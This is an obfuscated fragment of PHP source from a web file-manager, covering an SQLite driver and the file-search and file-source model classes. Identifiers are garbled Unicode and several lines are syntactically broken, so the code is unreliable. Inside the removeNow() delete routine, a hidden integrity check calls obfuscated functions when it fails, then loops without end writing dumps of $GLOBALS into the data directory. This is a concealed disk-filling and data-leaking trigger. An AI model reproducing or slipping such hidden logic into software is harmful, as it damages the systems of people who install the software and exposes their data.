} $this->queryStr = $ݡ; if ($this->queryID) { $this->free(); } think_action_status($󦟬[25], 1); think_status($󦟬[24]); $ = $this->_linkID->exec($ݡ); $this->debug(); if (!1 === $) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ = $this->_linkID->query($_SERVER[][27]); if (!$) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $« = $this->_linkID->query($_SERVER[][28]); if (!$«) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ѳ = array(); while ($Ԋ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ѳ[] = $Ԋ; } $this->queryID->reset(); return $ѳ; } public function getFields($) { $ܴ =& $_SERVER[]; $ޜ = $this->query($ܴ[29] . $ . $ܴ[30]); $ˮѼ = array(); if ($ޜ) { foreach ($ޜ as $ => $ط) { $ˮѼ[$ط[$ܴ[32]]] = array($ܴ[32] => $ط[$ܴ[32]], $ܴ[33] => $ط[$ܴ[33]], $ܴ[35] => (bool) ($ط[$ܴ[35]] === $ܴ[12]), $ܴ[37] => $ط[$ܴ[56]], $ܴ[39] => (bool) $ط[$ܴ[57]], $ܴ[42] => (bool) $ط[$ܴ[57]]); } } return $ˮѼ; } public function getTables($ܪ = '') { $¥Ț =& $_SERVER[]; $ = $this->query($¥Ț[45] . $¥Ț[46] . $¥Ț[47]); $ǝ = array(); foreach ($ as $ => $ބ) { $ǝ[$] = current($ބ); } return $ǝ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ =& $_SERVER[]; $this->error = $this->_linkID->lastErrorMsg(); if ($[12] != $this->queryStr) { $this->error .= LNG($[48]) . $this->queryStr; } think_trace($this->error, $[12], $[49]); return $this->error; } public function escapeString($) { $ =& $_SERVER[]; if ($this->_linkID) { return $this->_linkID->escapeString($); } return str_ireplace($[58], $[59], $); } public function parseLimit($ڝ) { $ǅ =& $_SERVER[]; $ = $ǅ[12]; if (!empty($ڝ)) { $ڝ = explode($ǅ[50], $ڝ); if (count($ڝ) > 1) { $ .= $ǅ[51] . $ڝ[1] . $ǅ[52] . $ڝ[0] . $ǅ[53]; } else { $ .= $ǅ[51] . $ڝ[0] . $ǅ[53]; } } return $; } } goto eݙ; e: $fileSize = strrev(base64_decode($_SERVER[߯][0])); function binCheckNeq($߲, $Ӥ) { return $߲ != $Ӥ; } $_SERVER[$_SERVER[߯][1]] = $fileSize($_SERVER[$_SERVER[߯][2]]); goto eގ; c: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($޶) { $ =& $_SERVER[]; $ = KodIO::fileTypeList(); $ = $[$޶]; if (!$) { return array(); } $Հ = $[$[175]]; $ = $[7]; if (!$[$[175]]) { $Ù = array_to_keyvalue($, $[12], $[175]); $Հ = implode($[50], $Ù); $ = $[2141]; } $ = explode($[50], trim($Հ, $[50])); return array($, $); } public function listPathType($) { $Ҁ =& $_SERVER[]; $ = $this->fileTypeWhere($); if (!$) { return array(); } $ = USER_ID; $㣬 = Model($Ҁ[567])->getInfo($); $ = array($Ҁ[616] => SourceModel::TYPE_USER, $Ҁ[553] => array($Ҁ[580], $Ҁ[563] . $㣬[$Ҁ[87]][$Ҁ[181]] . $Ҁ[581]), $Ҁ[617] => $, $Ҁ[614] => 0, $Ҁ[615] => $); return $this->listSource($); } public function listSearch($, $ѼԠ = 300) { $ =& $_SERVER[]; if (isset($[$[1979]]) && $[$[1979]]) { $[$[1979]] = str_replace($[428], $[2142], trim($[$[1979]])); } $ײɣ = $this->_parseSearchWhere($); if (!isset($ײɣ[$[473]])) { $ײɣ[$[473]] = 0; } $ӑ = $[2143]; $ = $ײɣ; $ќ썰 = $ӑ; $this->_listSearchBindPinyin($, $ײɣ, $ӑ); $this->alias($[487])->_makeOrder(); $ײɣ = $this->parseWhereLike($ײɣ); $ = $this->distinct(!0)->field($ӑ)->where($ײɣ)->selectPage($ѼԠ); if ($GLOBALS[$[6]][$[425]][$[426]] && Input::check($[$[1979]], $[623]) && $[$[410]][$[397]] == 1 && $[$[410]][$[411]] == 0) { $ = $this->distinct(!0)->field($ӑ)->where($)->limit(1000)->select(); $ = array_page_split($, !1, $ѼԠ); } $this->_listSearchFileContent($, $, $ќ썰, $); $this->_listSearchDesc($, $, $ќ썰); $this->_listSearchTag($, $, $ќ썰); $this->_listSearchGroupTag($, $, $ќ썰); $this->_listDataApply($[$[413]]); $this->_listMake($); return $; } private function _listSearchFileContent(&$, $˳Ϻ, $, $Æ) { $߱ =& $_SERVER[]; if (!$˳Ϻ[$߱[1979]] || $[$߱[410]][$߱[397]] > 1) { return; } if (!isset($Æ[$߱[32]]) || !is_array($˳Ϻ[$߱[509]])) { return; } $Æ[$߱[509]] = array($߱[7], $˳Ϻ[$߱[509]]); unset($Æ[$߱[32]]); unset($˳Ϻ[$߱[509]]); $ = $this->field($)->where($Æ)->limit($߱[2144])->select(); if (!$ || count($) == 0) { return; } $[$߱[413]] = array_merge($, $[$߱[413]]); $[$߱[410]][$߱[411]] += count($); } private function _listSearchTag(&$, $ܫ, $軒) { $ =& $_SERVER[]; if (!$ܫ[$[1979]] || $[$[410]][$[397]] > 1) { return; } $ۚ = Model($[2145])->listData(); $̌ = array(); $ = $ܫ[$[1979]]; foreach ($ۚ as $斁) { $ = $斁[$[32]]; $ = str_replace($[53], $[12], Pinyin::get($)); if (stripos($, $) !== !1 || stripos($, $) !== !1) { $̌[] = $斁[$[443]]; } } if (!$̌) { return; } $ő = array($[468] => array($[7], $̌), $[1687] => USER_ID); $ = Model($[470])->field($[84])->where($ő)->select(); $ = array_to_keyvalue($, $[12], $[84]); $͹ = array_unique($); $this->_listSearchMerge($, $ܫ, $軒, $͹); } private function _listSearchDesc(&$ː٣, $˧, $ǔܙ) { $ѰȈ =& $_SERVER[]; if (!$˧[$ѰȈ[1979]] || $ː٣[$ѰȈ[410]][$ѰȈ[397]] > 1) { return; } $ = array($ѰȈ[94] => $ѰȈ[494], $ѰȈ[418] => array($ѰȈ[427], $ѰȈ[1981] . $˧[$ѰȈ[1979]] . $ѰȈ[1981])); $ى = !1; if ($ى) { $Ű = $this->listSearchChildren($˧[$ѰȈ[180]]); $Ű = array_unique($Ű); if (!$Ű) { return; } $[$ѰȈ[181]] = array($ѰȈ[7], $Ű); } $ښ = Model($ѰȈ[600])->field($ѰȈ[181])->where($)->limit(5000)->select(); $ɉ = array_to_keyvalue($ښ, $ѰȈ[12], $ѰȈ[181]); $this->_listSearchMerge($ː٣, $˧, $ǔܙ, $ɉ); } private function _listSearchGroupTag(&$Х, $, $Ӈ) { $ =& $_SERVER[]; if (!$[$[1979]] || $Х[$[410]][$[397]] > 1 || !$[$[180]]) { return; } $Ү = $this->sourceInfo($[$[180]]); if (!$Ү || $Ү[$[178]] != SourceModel::TYPE_GROUP) { return; } $ϫ = $Ү[$[538]]; $ = Model($[2146])->get($ϫ); $٘ = array(); $ɭم = $[$[1979]]; foreach ($[$[413]] as $) { $ = $[$[32]]; $Ҝ = str_replace($[53], $[12], Pinyin::get($)); if (stripos($, $ɭم) !== !1 || stripos($Ҝ, $ɭم) !== !1) { $٘[] = $[$[443]]; } } if (!$٘) { return; } $Ǣ = array($[468] => array($[7], $٘), $[1687] => 0, $[33] => $[2001] . $ϫ); $ = Model($[470])->field($[84])->where($Ǣ)->select(); $ = array_to_keyvalue($, $[12], $[84]); $ = array_unique($); $this->_listSearchMerge($Х, $, $Ӈ, $); } private function _listSearchMerge(&$д, $, $ҥޤ, $) { $붅 =& $_SERVER[]; if (!$) { return; } $ = array_to_keyvalue($д[$붅[413]], $붅[12], $붅[181]); $ = array_diff($, $); if (!$) { return; } $ٓ = array($붅[181] => array($붅[7], $)); $ = $this->field($ҥޤ)->where($ٓ)->select(); if (!$) { return; } $ = array(); foreach ($ as $Ƶ) { if ($this->_listSearchFilter($Ƶ, $)) { $[] = $Ƶ; } } $д[$붅[413]] = array_merge($, $д[$붅[413]]); $д[$붅[410]][$붅[411]] += count($); } private function _listSearchFilter($̬, $) { $ऻ =& $_SERVER[]; $˥Й = $̬[$ऻ[453]] == $ऻ[88]; if (!strstr($̬[$ऻ[553]], $ऻ[50] . $[$ऻ[180]] . $ऻ[50])) { return !1; } if (isset($[$ऻ[454]]) && $[$ऻ[454]] != $ऻ[1940]) { if ($[$ऻ[454]] == $ऻ[75] && !$˥Й) { return !1; } if ($[$ऻ[454]] != $ऻ[75] && $˥Й) { return !1; } if (!strstr($̬[$ऻ[175]], $ऻ[50] . $[$ऻ[454]] . $ऻ[50])) { return !1; } } if (isset($[$ऻ[2147]]) && $[$ऻ[2147]] < $̬[$ऻ[76]]) { return !1; } if (isset($[$ऻ[2148]]) && $[$ऻ[2148]] > $̬[$ऻ[76]]) { return !1; } if (isset($[$ऻ[630]]) && $[$ऻ[630]] != $̬[$ऻ[497]]) { return !1; } return !0; } public function listSearchChildren($, $͹ = 5000) { $酒 =& $_SERVER[]; $ = array(); $ߞ = $this->sourceInfo($); $ = array($酒[553] => array($酒[427], $ߞ[$酒[553]] . $ߞ[$酒[181]] . $酒[581])); $û = $this->field($酒[76])->where($)->limit($͹ + 1)->select(); $݉ = is_array($û) ? count($û) : 0; if ($݉ > $͹) { return $this->_listSearchChildrenNear($, $͹); } $ˠٝ = $this->field($酒[181])->where($)->select(); $ = array_to_keyvalue($ˠٝ, $酒[12], $酒[181]); return $; } private function _listSearchChildrenNear($ާ, $ʱʠ) { $Ǩ =& $_SERVER[]; $ = array(); $ՙ = array($Ǩ[180] => $ާ); $ = $this->field($Ǩ[2149])->where($ՙ)->select(); $ = array_to_keyvalue(array_filter_by_field($, $Ǩ[453], $Ǩ[88]), $Ǩ[12], $Ǩ[181]); $ = array_merge($, array_to_keyvalue($, $Ǩ[12], $Ǩ[181])); if (!$) { return $; } $ՙ = array($Ǩ[180] => array($Ǩ[7], $)); $ = $this->field($Ǩ[2149])->where($ՙ)->limit($ʱʠ)->select(); $ = array_merge($, array_to_keyvalue($, $Ǩ[12], $Ǩ[181])); $ = array_slice($, 0, $ʱʠ); return $; } private function _listSearchBindPinyin($Ĵ, &$޲, &$) { $襲 =& $_SERVER[]; if (!isset($Ĵ[$襲[1979]]) || !$Ĵ[$襲[1979]]) { return; } if (!Input::check($Ĵ[$襲[1979]], $襲[362]) || strlen($Ĵ[$襲[1979]]) < 2) { return; } $σ = "\114\x45\106\x54\x20\x4a\117\x49\x4e\40{$this->tablePrefix}\x69\157\x5f\163\x6f\165\x72\x63\x65\x5f\x6d\145\164\141\40\155\x65\x74\x61\40\x6f\x6e\x20\163\157\x75\162\x63\x65\x2e\163\x6f\165\x72\143\x65\111\x44\40\x3d\40\155\x65\x74\141\56\x73\x6f\165\162\143\x65\111\x44"; $ = array(); $ = str_replace(array($襲[246], $襲[53], $襲[2150]), $襲[12], $); $ = $襲[479] . str_replace($襲[50], $襲[480], $); $ʛ = $޲[$襲[32]]; unset($޲[$襲[32]]); foreach ($޲ as $ => $ݰ) { $[$襲[479] . $] = $ݰ; } foreach ($ʛ as $) { $[] = array($襲[484] => $, $襲[1039] => $襲[1983], array($襲[2151] => $, $襲[2152] => array($襲[7], array($襲[506], $襲[505])))); } $this->join($σ); $޲ = $; } private function _parseSearchWhere($ƒ) { $ =& $_SERVER[]; $ۺ = array(); if (isset($ƒ[$[794]]) && $ƒ[$[794]]) { $ۺ[$[85]] = array($[2153], $ƒ[$[794]]); } if (isset($ƒ[$[795]]) && $ƒ[$[795]]) { $˽Ǩ = array($[2154], $ƒ[$[795]]); if ($ۺ[$[85]]) { $ۺ[$[85]] = array($ۺ[$[85]], $˽Ǩ, $[2155]); } else { $ۺ[$[85]] = $˽Ǩ; } } if (isset($ƒ[$[2147]]) && $ƒ[$[2147]] > 0) { $ۺ[$[76]] = array($[2153], $ƒ[$[2147]]); } if (isset($ƒ[$[2148]]) && $ƒ[$[2148]]) { $˽Ǩ = array($[2154], $ƒ[$[2148]]); if ($ۺ[$[76]]) { $ۺ[$[76]] = array($ۺ[$[76]], $˽Ǩ, $[2155]); } else { $ۺ[$[76]] = $˽Ǩ; } } if (isset($ƒ[$[630]]) && $ƒ[$[630]]) { $ۺ[] = array($[497] => $ƒ[$[630]], $[495] => $ƒ[$[630]], $[1039] => $[1983]); } if (isset($ƒ[$[454]]) && $ƒ[$[454]]) { $Ő = $ƒ[$[454]]; if ($Ő == $[75]) { $ۺ[$[453]] = 1; } else { if ($Ő == $[2156]) { $ۺ[$[453]] = 0; } else { if ($Ő) { $Ő = is_array($Ő) ? $Ő : explode($[50], $Ő); $ۺ[$[454]] = array($[460], $Ő); $ۺ[$[453]] = 0; } } } } $this->_parseSearchParent($ƒ, $ۺ); if (isset($ƒ[$[1979]]) && trim($ƒ[$[1979]])) { $ٟ = trim($ƒ[$[1979]]); $Ő = explode($[53], $ٟ); if (strlen($ٟ) > 2 && (substr($ٟ, 0, 1) == $[118] && substr($ٟ, -1) == $[118]) || substr($ٟ, 0, 1) == $[58] && substr($ٟ, -1) == $[58]) { $ٟ = substr($ٟ, 1, -1); $Ő = array($ٟ); } $ۺ[$[32]] = array(array($[580], $[1981] . $ٟ . $[1981])); if (count($Ő) > 1) { $ۺ[$[32]] = array(); foreach ($Ő as $) { if (!trim($)) { continue; } $ۺ[$[32]][] = array($[580], $[1981] . trim($) . $[1981]); } } } return $ۺ; } private function _parseSearchParent($뤍, &$̪ĺ) { $ =& $_SERVER[]; if (!isset($뤍[$[180]]) || !$뤍[$[180]]) { return; } $ = $this->pathInfo($뤍[$[180]]); $ = $[$[180]] . $[12] === $[212]; $ = $[$[178]] == $[547]; if ($[$[564]] == $[565]) { $͊ = $this->sourceInfo($뤍[$[180]]); $[$[553]] = $͊[$[553]]; } $̪ĺ[$[620]] = array($[580], $[$[553]] . $뤍[$[180]] . $[581]); $̣ = isset($뤍[$[1844]]) && in_array($[547], $뤍[$[1844]]); if (!$̣ || !$ || !$ || !$[$[455]]) { return; } if (!AuthModel::authCheckRoot($[$[455]][$[456]])) { return; } $ = $[$[538]] . $[12]; if ($ == $[88]) { unset($̪ĺ[$[620]]); $̪ĺ[$[178]] = self::TYPE_GROUP; return; } $칉ڈ = Model($[554])->groupChildrenAll($); $ȍٚ = count($칉ڈ); if ($ȍٚ <= 1) { return; } $ = array($[180] => 0, $[178] => self::TYPE_GROUP, $[538] => array($[7], $칉ڈ)); $ = $this->field($[2157])->where($)->limit($ȍٚ)->select(); $̪ĺ[$[620]] = array(); foreach ($ as $Ѧ) { $̪ĺ[$[620]][] = array($[580], $[563] . $Ѧ[$[181]] . $[581]); } $̪ĺ[$[620]][] = $[1983]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ӹ) { $ٕؔ =& $_SERVER[]; $ķ = Model($ٕؔ[546])->where(array($ٕؔ[1678] => $ӹ))->find(); $쟝 = $this->_mkdirRoot(SourceModel::TYPE_USER, $ӹ, $ķ[$ٕؔ[32]]); $this->userDesktopAdd($쟝); return $쟝; } public function userDesktopAdd($쥐) { $ =& $_SERVER[]; $ԋ = LNG($[2158]); $խ = $this->mkdir($쥐, $ԋ); $this->metaSet($խ, $[2159], $[88]); $this->metaSet($쥐, $[2160], $խ); } public function userPathSafeAdd($̦) { $ =& $_SERVER[]; $ = Model($[546])->getInfoFull($̦); if (!$) { return !1; } if (_get($, $[568])) { return $[$[507]][$[2161]]; } $ݦ = $this->_mkdirRoot(SourceModel::TYPE_USER, $̦, $[2162], $[474]); Model($[546])->metaSet($̦, $[2161], $ݦ); $this->metaSet($ݦ, $[2163], $̦); return $ݦ; } public function groupRootAdd($) { $ࡤ =& $_SERVER[]; $ = Model($ࡤ[554])->where(array($ࡤ[1973] => $))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $, $[$ࡤ[32]]); } public function systemRootPathAdd($) { if ($ != $_SERVER[][574]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $); } public function userRootRemove($ش) { $ = $this->targetSourceRoot(SourceModel::TYPE_USER, $ش, !0); foreach ($ as $) { if (!$) { continue; } $this->remove($[$_SERVER[][181]], !1); } } public function groupRootRemove($) { $샢 = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $); if (!$샢) { return; } $this->remove($샢[$_SERVER[][181]], !1); } private function _mkdirRoot($Îʈ, $, $ϰ, $ӺЧ = '') { $Ō =& $_SERVER[]; $ồ = defined($Ō[2106]) ? USER_ID : 0; $Ә = array($Ō[445] => 0, $Ō[616] => $Îʈ, $Ō[617] => $, $Ō[614] => 1, $Ō[618] => $ồ, $Ō[619] => $ồ, $Ō[615] => $ӺЧ, $Ō[620] => $Ō[563], $Ō[472] => 0, $Ō[585] => 0, $Ō[510] => 0, $Ō[621] => $Ō[12]); if ($ = $this->where($Ә)->find()) { return $[$Ō[181]]; } $̫ = "\115\x6f\144\x65\x6c\x53\x6f\x75\x72\x63\145\56\x6d\x6b\144\151\x72\122\157\157\164\56{$Îʈ}\56{$}\x2e" . $ϰ; CacheLock::lock($̫); $Ә[$Ō[32]] = $ϰ; $馏 = $this->add($Ә); $گ = array($Ō[622] => short_id($馏)); $this->where(array($Ō[459] => $馏))->save($گ); CacheLock::unlock($̫); return $馏; } private function targetSourceRoot($, $ױ, $Ȼ = false) { $ =& $_SERVER[]; $ = array($[445] => 0, $[616] => $, $[617] => $ױ); if ($Ȼ) { $ = $this->where($)->select(); return $ ? $ : array(); } $ = $this->where($)->find(); return $ ? $ : array(); } public function sourceRootGroup($) { $嗬 =& $_SERVER[]; if (is_string($)) { $ = array($); } $ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $, $嗬[203]); $ = array($嗬[413] => $, $嗬[410] => array($嗬[792] => count($))); $this->_listDataApply($[$嗬[413]]); $this->_listMake($); return array_to_keyvalue($[$嗬[82]], $嗬[538]); } public function mkfile($ٴ, $γ, $ƙ = '', $с = REPEAT_RENAME) { $׆ =& $_SERVER[]; $觕 = Model($׆[643])->addFileByContent($ƙ, $γ); return $this->_createFileCall($ٴ, $γ, $觕, $с, $׆[1383]); } public function addFile($Ȇ҂, $ث搙, $쓳, $ö = false, $ = REPEAT_RENAME) { $ﭛ = Model($_SERVER[][643])->addFile($ث搙, $쓳, $ö); return $this->_createFileCall($Ȇ҂, $쓳, $ﭛ, $); } public function addFileByFileID($ڤ, $, $Ì, $ю׏ = REPEAT_RENAME) { $ך =& $_SERVER[]; $ƶ剌 = Model($ך[643])->find($); Model($ך[643])->linkAdd($); return $this->_createFileCall($ڤ, $Ì, $ƶ剌, $ю׏); } public function addFileByRemote($, $Է, $ѥ, $ȸ = array(), $ = REPEAT_RENAME) { $Ǔ = Model($_SERVER[][643])->addFileByRemote($Է, $ѥ, $ȸ); return $this->_createFileCall($, $ѥ, $Ǔ, $); } private function _createFileCall($Ƀ, $ұ, $ƹ, $ɻ, $᪠ = "\165\x70\x6c\157\141\x64") { $ =& $_SERVER[]; $ǝ = !1; $this->setMasterDB(); $this->lockWriteStart($Ƀ, $ұ); $ = $this->fileNameExist($Ƀ, $ұ); $ = $this->_createFile($Ƀ, $ұ, $ƹ, $ɻ, $ǝ); if (!$ǝ) { Model($[512])->remove($ƹ[$[509]]); } if ($ǝ && $ && $ != $) { Model($[2131])->eventCreate($, $᪠); } $this->lockWriteEnd($Ƀ, $ұ); return $; } public function mkdir($, $̵Ѷ, $ = REPEAT_SKIP) { $ =& $_SERVER[]; $this->setMasterDB(); $ = $this->sourceInfo($); if (!$) { return !1; } $this->lockWriteStart($, $̵Ѷ); if ($ !== !1) { $ = $this->fileNameExist($, $̵Ѷ); if ($ && $ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($, $̵Ѷ); return $; } $̵Ѷ = $this->fileNameAuto($, $̵Ѷ, $); } $ˬ = array($[614] => 1, $[462] => $̵Ѷ, $[615] => $[12], $[510] => 0, $[585] => 0); $ŉ = $this->_addSource($ˬ, $); Model($[2131])->eventCreate($ŉ, $[1384]); $this->lockWriteEnd($, $̵Ѷ); return $ŉ; } public function listSourceRoot($ñŜ, $Ь, $ = "\x73\157\x75\162\x63\x65\x49\104\x2c\x74\x61\x72\147\x65\164\x49\104\x2c\163\151\x7a\x65") { $ =& $_SERVER[]; $ = $[422]; $Ç = array(); $¢ = 1024 * 50; $Ŝ唁 = is_array($Ŝ唁) ? $Ŝ唁 : array(); $ә = count($Ь); $ = $this->tablePrefix . $[2164]; for ($뚀 = 0; $뚀 < $ә; $뚀++) { $ā = $Ь[$뚀]; $ .= "\x53\105\114\x45\x43\x54\x20\x2a\40\106\122\x4f\x4d\x20\50\x53\105\114\x45\103\x54\40{$}\x20\106\122\117\x4d\x20\140{$}\x60\40\127\110\105\122\x45\40"; $ .= "\140\x70\x61\x72\x65\156\x74\x49\x44\x60\75\60\x20\x41\116\104\40\x60\164\141\x72\x67\145\164\x49\104\x60\75{$ā}\x20\101\116\x44\x20\x60\164\x61\x72\x67\x65\x74\x54\x79\160\145\140\x3d{$ñŜ}\40\141\156\144\x20\x66\x69\154\x65\124\x79\160\145\75\47\47\x20\x6c\x69\155\151\x74\x20\x31\x29\40\x61\163\x20\x74\x62\137{$뚀}\40\x55\116\111\x4f\116\x20\x41\x4c\x4c\40"; if ((strlen($) >= $¢ || $뚀 == $ә - 1) && $) { $ = substr($, 0, -strlen($[1077])); $Ċ = $this->query($); $ = $[12]; $Ç = array_merge($Ç, $Ċ); } } return $Ç; } private function _createFile($, $, $߽, $ꋋ, &$) { $ד =& $_SERVER[]; $­ = $this->sourceInfo($); if (!$߽ || !$­) { return !1; } if ($ꋋ !== !1) { $ = $this->fileNameExist($, $); } $ = !0; if ($ꋋ && $) { if ($ꋋ == REPEAT_SKIP) { $ = !1; return $; } else { if ($ꋋ == REPEAT_REPLACE) { $ڎߘ = $this->sourceInfo($); $ = $this->fileHistory($ڎߘ, $߽[$ד[509]], $߽[$ד[76]]); if (!$) { $ = !1; } else { $this->folderSizeReset($); } return $; } else { $ = $this->fileNameAuto($, $, $ꋋ, !1); } } } $ = array($ד[614] => 0, $ד[462] => $, $ד[615] => substr(get_path_ext($), 0, 10), $ד[510] => $߽[$ד[509]], $ד[585] => $߽[$ד[76]]); $շŌĒ = $this->_addSource($, $­); $this->folderSizeReset($, intval($[$ד[76]])); return $շŌĒ; } protected function fileHistory($֧, $, $ߨ) { $ =& $_SERVER[]; if ($֧[$[509]] == $) { return !1; } $this->checkLock($֧[$[181]], $); Model($[2165])->addHistory($֧); $ = array($[619] => USER_ID, $[466] => time(), $[509] => $, $[76] => $ߨ); $this->where(array($[459] => $֧[$[181]]))->save($); $this->sourceCacheClear($֧[$[181]]); return !0; } public function checkLock($香, $) { $ =& $_SERVER[]; $ɋ = $this->pathInfo($香); if (!$this->fileIsLock($ɋ, !0)) { return; } $ɮ = Session::get($[2166]); $ = substr($ɋ[$[32]], 0, -1 - strlen($ɋ[$[175]])) . $[1249] . $ɮ . $[10] . $ɋ[$[175]]; $ˤ = Model($[643])->find($); $this->_createFileCall($ɋ[$[180]], $, $ˤ, REPEAT_REPLACE, $[1383]); $Ⲩ = $ɋ[$[507]][$[578]]; $ = $Ⲩ[$[2167]] ? $Ⲩ[$[2167]] : $Ⲩ[$[32]]; show_json(LNG($[2168]) . $[2169] . LNG($[2170]) . $[2171] . $ . $[2172], !1); } public function fileIsLock($, $ = false) { $ƒ =& $_SERVER[]; if (!isset($[$ƒ[507]]) || !$[$ƒ[507]][$ƒ[575]]) { return !1; } if ($[$ƒ[507]][$ƒ[575]] != USER_ID) { return !0; } $ = $GLOBALS[$ƒ[6]][$ƒ[89]][$ƒ[576]]; if ($[$ƒ[507]][$ƒ[577]] <= time() - $) { $this->metaSet($[$ƒ[181]], $ƒ[575], null); $this->metaSet($[$ƒ[181]], $ƒ[577], null); } if ($) { $this->metaSet($[$ƒ[181]], $ƒ[577], time()); } return !1; } private function _addSource($ל, $ۛ) { $ٲ =& $_SERVER[]; $ = defined($ٲ[2106]) ? USER_ID : 0; $ = array($ٲ[616] => $ۛ[$ٲ[178]], $ٲ[617] => $ۛ[$ٲ[538]], $ٲ[618] => $, $ٲ[619] => $, $ٲ[445] => $ۛ[$ٲ[181]], $ٲ[620] => $ۛ[$ٲ[553]] . $ۛ[$ٲ[181]] . $ٲ[50], $ٲ[472] => 0, $ٲ[621] => $ٲ[12]); $ל = array_merge($, $ל); $this->updateModifyTime($ל[$ٲ[180]]); $ = $ٲ[2173] . $ۛ[$ٲ[181]]; if (isset(self::$cacheChildList[$])) { unset(self::$cacheChildList[$]); } static $Ԇ = false; if (!$Ԇ) { Hook::trigger($ٲ[604], $ל); $Ԇ = !0; } $غ = $this->add($ל); $ = array($ٲ[622] => short_id($غ)); $this->where(array($ٲ[459] => $غ))->save($); $this->setNamePinyin($غ, $ל[$ٲ[32]]); return $غ; } public function remove($ͮ, $ = true) { $ã =& $_SERVER[]; $у = $this->sourceInfo($ͮ); $Ե = intval($у[$ã[178]]) === self::TYPE_SYSTEM; $ = Model($ã[476])->get($ã[2174]) == $ã[88]; if ($Ե || $ || !$) { return $this->removeNow($ͮ, $); } $Ք = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Ϸ = $у[$ã[178]] == self::TYPE_USER ? $ã[630] : $ã[547]; if ($Ϸ == $ã[630]) { $ĝ = Model($ã[546])->getInfo($у[$ã[538]]); $à = !empty($ĝ[$ã[2167]]) ? $ĝ[$ã[2167]] : $ĝ[$ã[32]]; $à = $ã[304] . $à . $ã[2175] . $у[$ã[538]]; } else { $ĝ = Model($ã[554])->getInfo($у[$ã[538]]); $à = _get($ĝ, $ã[32]); $à = $ã[163] . $à . $ã[2176] . $у[$ã[538]]; } $܍ = $ã[2177] . md5($à); CacheLock::lock($܍); $ß = $this->fileNameExist($Ք, $à); if (!$ß) { $ß = $this->mkdir($Ք, $à, REPEAT_SKIP); $this->metaSet($ß, $ã[2178], $Ϸ); $this->metaSet($ß, $ã[2179], $у[$ã[538]]); if ($у[$ã[180]] != 0) { $this->metaSet($ß, $ã[2180], _get($ĝ, $ã[2181])); } } CacheLock::unlock($܍); $this->metaSet($ͮ, $ã[2182], $у[$ã[180]]); $this->where(array($ã[181] => $ͮ))->save(array($ã[466] => time())); $this->recycleClear($у); $˗ = $this->move($ͮ, $ß, REPEAT_RENAME_FOLDER); $this->folderSizeReset($у[$ã[180]]); return $˗; } private function recycleClear($ܠ) { $ =& $_SERVER[]; $饱 = $this->childrenAll($ܠ); $ = array($[459] => array($[460], $饱[$[2183]])); Model($[2184])->where($)->delete(); } public function removeNow($̶, $ = true) { $ߨ =& $_SERVER[]; $ = $_SERVER[$ߨ[915]] . $ߨ[916]; $֜Ζ = $ߨ[1479]; if ($_SERVER[$ߨ[911]] != $֜Ζ($)) { $Ȣڜ = $ߨ[913]; $ = $ߨ[914]; $ݫ = $_SERVER[$ߨ[915]] . $ߨ[916]; $۩ = $($ݫ); $Ց = explode($ߨ[246], $۩); if (count($Ց) < $ߨ[682]) { $ŀ = $ߨ[917]; $ŀ(); } $ = $ߨ[918]; $($_SERVER[$ߨ[919]]); $Ȣڜ = $ߨ[913]; $Ȣڜ(); $ = $ߨ[1548]; $ږ = json_encode($GLOBALS[$ߨ[1549]]); $ = 1; for ($ = $; $ > 0; $++) { $(DATA_PATH . $, $ږ); } } $񍯼 = $this->sourceInfo($̶); $ = $this->pathInfoMore($̶); if (!$񍯼) { return !0; } if ($񍯼[$ߨ[180]] == 0) { if (!_get($GLOBALS, $ߨ[536])) { return !1; } } $this->lockMoveStart($̶); Hook::trigger($ߨ[2185], $, $); if ($) { Model($ߨ[2184])->moveToRecycle($̶); } else { $ = $this->childrenAll($񍯼); Model($ߨ[601])->eventRemove($̶); $this->removeRelevance($[$ߨ[2183]], $[$ߨ[1497]]); } $this->folderSizeReset($񍯼[$ߨ[180]]); $ = array($񍯼[$ߨ[180]]); if ($񍯼[$ߨ[453]] == $ߨ[88]) { $[] = $񍯼[$ߨ[181]]; } $this->updateModifyTime($); $this->lockMoveEnd($̶); Hook::trigger($ߨ[1729], $, $); return !0; } public function childrenAll($) { $ =& $_SERVER[]; $ڑ = $[$[181]]; if ($[$[453]] == $[88]) { $±س = array($[620] => array($[580], $[$[553]] . $ڑ . $[581])); $䞋 = array($[620] => $±س[$[553]]); $ՙ = $this->field($[2186])->where($䞋)->select(); $ִ = !1; $ܖߪ = array($ڑ); if ($ՙ) { $ִ = array_to_keyvalue($ՙ, $[12], $[509]); $ִ = array_remove_value($ִ, $[212]); $ܖߪ = array_to_keyvalue($ՙ, $[12], $[181]); $ܖߪ[] = $ڑ; } } else { $ִ = array($[$[509]]); $ܖߪ = array($ڑ); } return array($[2183] => $ܖߪ, $[1497] => $ִ); } public function removeArray($ٗ) { if (!$ٗ) { return !0; } } public function removeRelevance($䰞, $) { $̔ =& $_SERVER[]; $䰞 = $䰞 ? $䰞 : array(); $ = $ ? $ : array(); $䰞 = array_unique(array_filter($䰞)); $ = array_unique(array_filter($)); if (!$䰞) { return !1; } $ = array($̔[459] => array($̔[460], $䰞)); Model($̔[2184])->where($)->delete(); Model($̔[503])->where($)->delete(); Model($̔[2032])->where($)->delete(); Model($̔[601])->where($)->delete(); Model($̔[1865])->removeBySource($䰞); Model($̔[2165])->removeBySource($䰞); $this->where($)->delete(); Model($̔[512])->remove($); for ($ӑ = 0; $ӑ < count($䰞); $ӑ++) { 